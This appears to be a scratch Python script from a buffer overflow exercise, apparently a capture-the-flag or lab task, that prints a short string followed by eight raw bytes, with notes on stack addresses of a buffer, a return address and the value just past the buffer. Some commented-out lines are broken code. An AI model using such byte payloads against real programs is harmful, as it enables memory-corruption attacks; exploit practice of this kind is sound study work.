import sys
def echo(s):
	if type(s) is bytes :
		sys.stdout.buffer.write(s)
	if type(s) is str :
		sys.stdout.buffer.write(bytes(f'{s}', 'utf-8'))
#echo('ABCD')
#c = chr('0x3e85')
#echo("".format(c))

echo('aabb')
#echo(b'\x3e\x85\xc7\x07\xf0\x9b\x9c\x00')
echo(b'\x00\xdf\x87\xb1\xce\x64\x05\x26')
#{chr('0xc707')}{chr('0xf09b')}{chr('0x9c00')}')
'''
start of buffer      - 0x7fffffffe644
ret source for jmp   - 0x7fffffffe658
imediately after buf - 0x3e85c707f09b9c00

3931063834778223360
3283230000272214528
'''